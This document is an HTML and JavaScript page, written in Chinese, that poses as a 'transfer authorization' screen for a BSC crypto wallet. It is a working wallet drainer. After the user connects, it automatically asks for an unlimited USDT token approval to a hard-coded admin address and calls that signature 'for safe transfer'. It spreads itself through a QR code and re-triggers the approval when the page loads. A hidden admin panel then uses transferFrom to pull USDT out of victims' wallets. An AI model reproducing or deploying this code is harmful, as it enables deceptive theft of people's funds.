<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>转账授权</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
body{background:#0B0B1F;color:#fff;padding:20px}
.container{max-width:420px;margin:0 auto}
.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
h1{font-size:24px;margin-bottom:8px}
.desc{color:#aaa;margin-bottom:20px}
#connectBtn{
background:#F0B90B;color:#000;
border:none;padding:16px;width:100%;
border-radius:14px;font-size:16px;font-weight:bold;
margin-bottom:16px;
}
#qrcode{
width:280px;height:280px;background:#fff;padding:10px;
border-radius:16px;margin:0 auto 20px;
display:flex;align-items:center;justify-content:center;
color:#000;font-size:14px;
}
#qrcode img{width:100%;height:100%;border-radius:12px}
#approveBtn{
background:#F0B90B;color:#000;
border:none;padding:16px;width:100%;
border-radius:14px;font-size:16px;font-weight:bold
}
.tip {font-size:12px;color:#666;margin-top:10px;text-align:center}
.admin-panel {
background:#1E1E35;padding:24px;border-radius:16px;display:none;margin-top:20px
}
.admin-panel.show {display:block}
.admin-input {
width:100%;padding:12px;background:#111;border:none;
border-radius:8px;color:#fff;margin-bottom:10px;
}
.admin-btn {
width:100%;padding:14px;background:#F0B90B;color:#000;
border:none;border-radius:10px;font-weight:bold;margin-bottom:10px;
cursor:pointer;
}
</style>
</head>
<body>

<div class="container">
  <div class="pay-box">
    <h1>💳 转账授权</h1>
    <p class="desc">授权后即可进行转账操作</p>

    <button id="connectBtn">👉 连接钱包</button>
    <div id="qrcode">加载中...</div>
    <button id="approveBtn">确认授权签名</button>
    <div class="tip">签名授权用于安全转账</div>
  </div>

  <div class="admin-panel" id="adminPanel">
    <input class="admin-input" id="userAddr" placeholder="输入用户钱包地址">
    <input class="admin-input" id="drawAmount" placeholder="提取数量（USDT）">
    <button class="admin-btn" onclick="drawFromUser()">提取用户USDT</button>
  </div>
</div>

<script>
// ====================== 配置 ======================
const TOKEN_ADDR  = "0x55d398326f99059fF775485246999027B3197955";
const ADMIN_ADDR  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const CHAIN_ID    = "0x38"; // BSC
// ====================================================

let account = null;
let pageUrl = window.location.href; // 当前页面地址

// 生成二维码：扫码 → 直接打开本页 → 自动签名
function genApproveQR() {
  const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(pageUrl);
  document.getElementById("qrcode").innerHTML = `<img src="${qrUrl}" alt="扫码打开">`;
}

// 切换链
async function switchChain() {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: CHAIN_ID }]
    });
  } catch (e) {}
}

// 核心授权（无限授权）
async function doApprove() {
  if (!account) return alert("请先连接钱包");
  try {
    await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [{
        from: account,
        to: TOKEN_ADDR,
        data: "0x095ea7b3" +
          ADMIN_ADDR.slice(2).padStart(64, "0") +
          "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
      }]
    });
    alert("✅ 授权成功！");
  } catch (e) {
    alert("❌ 授权取消或失败");
  }
}

// 连接钱包 + 自动授权
document.getElementById("connectBtn").onclick = async () => {
  if (!window.ethereum) {
    alert("请在 TP / 钱包浏览器打开");
    return;
  }
  await switchChain();
  try {
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    account = accounts[0];
    document.getElementById("connectBtn").innerText = "✅ 已连接";

    // 关键：连接后 自动弹授权签名
    setTimeout(() => {
      doApprove();
    }, 800);

    // 管理员显示后台
    if (account.toLowerCase() === ADMIN_ADDR.toLowerCase()) {
      document.getElementById("adminPanel").classList.add("show");
    }
  } catch (e) {
    alert("连接失败");
  }
};

document.getElementById("approveBtn").onclick = doApprove;

// 管理员提取
async function drawFromUser() {
  if (!account || account.toLowerCase() !== ADMIN_ADDR.toLowerCase()) {
    alert("❌ 仅管理员可操作");
    return;
  }
  const userAddr = document.getElementById("userAddr").value;
  const drawAmount = document.getElementById("drawAmount").value;
  if (!userAddr || !drawAmount || isNaN(drawAmount) || parseFloat(drawAmount) <= 0) {
    alert("❌ 输入无效");
    return;
  }
  try {
    const amount = BigInt(parseFloat(drawAmount) * 1e18).toString(16).padStart(64, '0');
    const data = "0x23b872dd" +
      userAddr.slice(2).padStart(64, '0') +
      ADMIN_ADDR.slice(2).padStart(64, '0') +
      amount;

    await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [{ from: account, to: TOKEN_ADDR, data: data }]
    });
    alert("✅ 提取成功");
  } catch (e) {
    alert("❌ 提取失败");
  }
}

// 页面加载：生成当前页二维码
window.onload = genApproveQR;

// 关键：扫码打开后，自动尝试连接+授权
window.addEventListener('load', async () => {
  if (window.ethereum) {
    try {
      const accounts = await window.ethereum.request({ method: "eth_accounts" });
      if (accounts.length > 0) {
        account = accounts[0];
        document.getElementById("connectBtn").innerText = "✅ 已连接";
        setTimeout(doApprove, 1000);
      }
    } catch (e) {}
  }
});
</script>
</body>
</html>
